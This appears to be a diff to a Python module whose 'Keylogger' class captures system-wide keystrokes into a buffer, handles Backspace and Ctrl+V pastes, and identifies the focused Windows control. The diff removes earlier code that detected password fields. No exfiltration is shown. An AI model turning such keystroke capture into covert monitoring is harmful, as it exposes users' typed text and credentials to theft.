@@ -20,19 +20,20 @@ from typing import Callable, Optional
 logger = logging.getLogger(__name__)
 
 # Windows API constants
+VK_BACK = 0x08  # Backspace
+VK_TAB = 0x09
+VK_RETURN = 0x0D
 VK_SHIFT = 0x10
 VK_CONTROL = 0x11
 VK_MENU = 0x12  # Alt
-VK_TAB = 0x09
-VK_RETURN = 0x0D
 VK_SPACE = 0x20
+VK_V = 0x56
 VK_LSHIFT = 0xA0
 VK_RSHIFT = 0xA1
 VK_LCONTROL = 0xA2
 VK_RCONTROL = 0xA3
 VK_LMENU = 0xA4
 VK_RMENU = 0xA5
-VK_V = 0x56
 CF_UNICODETEXT = 13
 
 
@@ -84,106 +85,34 @@ class FocusedElementInfo:
     def __init__(self):
         self._is_windows = platform.system() == "Windows"
         self._user32 = None
-        self._oleacc = None
-        self._automation = None
         
         if self._is_windows:
             try:
                 self._user32 = ctypes.windll.user32
-                self._oleacc = ctypes.windll.oleacc
-            except Exception:
-                pass
-            
-            # Try to use UI Automation for better element detection
-            try:
-                import comtypes.client
-                self._automation = comtypes.client.CreateObject(
-                    "{ff48dba4-60ef-4201-aa87-54103eef594e}",
-                    interface=comtypes.gen.UIAutomationClient.IUIAutomation
-                )
             except Exception:
                 pass
     
     def get_focused_field(self) -> tuple[str, str]:
-        """Get focused field info: (field_name, field_type).
-        
-        Returns:
-            Tuple of (field_name, field_type) e.g. ("Email", "Edit") or ("Password", "Password")
-        """
-        if not self._is_windows:
-            return ("", "")
-        
-        # Try UI Automation first (most accurate)
-        if self._automation:
-            try:
-                return self._get_field_via_uia()
-            except Exception:
-                pass
-        
-        # Fallback to MSAA/IAccessible
-        try:
-            return self._get_field_via_msaa()
-        except Exception:
-            pass
-        
-        return ("", "")
-    
-    def _get_field_via_uia(self) -> tuple[str, str]:
-        """Get field info using UI Automation."""
-        try:
-            import comtypes.client
-            from comtypes.gen.UIAutomationClient import (
-                UIA_NamePropertyId,
-                UIA_ControlTypePropertyId,
-                UIA_LocalizedControlTypePropertyId,
-                UIA_IsPasswordPropertyId,
-            )
-            
-            focused = self._automation.GetFocusedElement()
-            if not focused:
-                return ("", "")
-            
-            # Get field name
-            name = focused.GetCurrentPropertyValue(UIA_NamePropertyId) or ""
-            
-            # Get control type
-            control_type = focused.GetCurrentPropertyValue(UIA_LocalizedControlTypePropertyId) or ""
-            
-            # Check if password field
-            is_password = focused.GetCurrentPropertyValue(UIA_IsPasswordPropertyId)
-            if is_password:
-                control_type = "Password"
-            
-            return (str(name), str(control_type))
-        except Exception:
-            return ("", "")
-    
-    def _get_field_via_msaa(self) -> tuple[str, str]:
-        """Get field info using MSAA (IAccessible)."""
-        if not self._oleacc or not self._user32:
+        """Get focused field info: (field_name, field_type)."""
+        if not self._is_windows or not self._user32:
             return ("", "")
         
         try:
-            # OBJID_FOCUS = 0xFFFFFFF6
-            OBJID_CARET = 0xFFFFFFF8
-            
             hwnd = self._user32.GetForegroundWindow()
             if not hwnd:
                 return ("", "")
             
-            # Get focused child
+            # Get focused child control
             focus_hwnd = self._user32.GetFocus()
             if not focus_hwnd:
                 focus_hwnd = hwnd
             
-            # Get class name of focused control
+            # Get class name
             class_buffer = ctypes.create_unicode_buffer(256)
             self._user32.GetClassNameW(focus_hwnd, class_buffer, 256)
             class_name = class_buffer.value
             
-            # Map class names to field types
             field_type = self._class_to_type(class_name)
-            
             return ("", field_type)
         except Exception:
             return ("", "")
@@ -202,8 +131,6 @@ class FocusedElementInfo:
             return "Button"
         elif "richedit" in class_lower:
             return "RichEdit"
-        elif "scintilla" in class_lower:
-            return "CodeEditor"
         elif "chrome" in class_lower or "mozilla" in class_lower:
             return "Browser"
         elif class_name:
@@ -539,14 +466,13 @@ class Keylogger:
                 key_name = key_name.lower()
             key_char = getattr(key, "char", None)
             vk_code = getattr(key, "vk", None)
-            scan_code = getattr(key, "_scan", 0) or 0
             
             # Track Ctrl
             if key_name in ("ctrl_l", "ctrl_r", "ctrl") or vk_code in (VK_CONTROL, VK_LCONTROL, VK_RCONTROL):
                 self._ctrl_pressed = True
                 return
             
-            # Ignore other modifiers
+            # Ignore modifier keys (Shift, Alt, etc.)
             if key_name in self.MODIFIER_NAMES or vk_code in (VK_SHIFT, VK_LSHIFT, VK_RSHIFT, VK_MENU, VK_LMENU, VK_RMENU):
                 return
             
@@ -554,20 +480,28 @@ class Keylogger:
             if self._ctrl_pressed:
                 if vk_code == VK_V or (key_char and (key_char.lower() == "v" or key_char == "\x16")):
                     self._handle_paste()
-                return  # Ignore all Ctrl+key
+                return  # Ignore all Ctrl+key combinations
             
-            # Get character
+            # Handle Backspace - remove last character from buffer
+            if key_name == "backspace" or vk_code == VK_BACK:
+                with self._buffer_lock:
+                    if self._buffer.text:
+                        self._buffer.text = self._buffer.text[:-1]
+                        self._buffer.last_updated = time.time()
+                return
+            
+            # Get character - prefer pynput's char (already handles Shift for uppercase)
             char = None
             
-            if vk_code is not None and platform.system() == "Windows":
+            # First try pynput's char - it already includes uppercase from Shift
+            if key_char is not None:
+                if ord(key_char) >= 32:  # Printable character
+                    char = key_char
+            
+            # Handle special keys (Space, Enter, Tab)
+            if char is None and vk_code is not None:
                 if vk_code in self.VK_SPECIAL:
                     char = self.VK_SPECIAL[vk_code]
-                else:
-                    char = self._kb_helper.vk_to_char(vk_code, scan_code)
-            
-            if char is None and key_char:
-                if ord(key_char) >= 32 or key_char in ("\t", "\n", "\r"):
-                    char = key_char
             
             if not char:
                 return
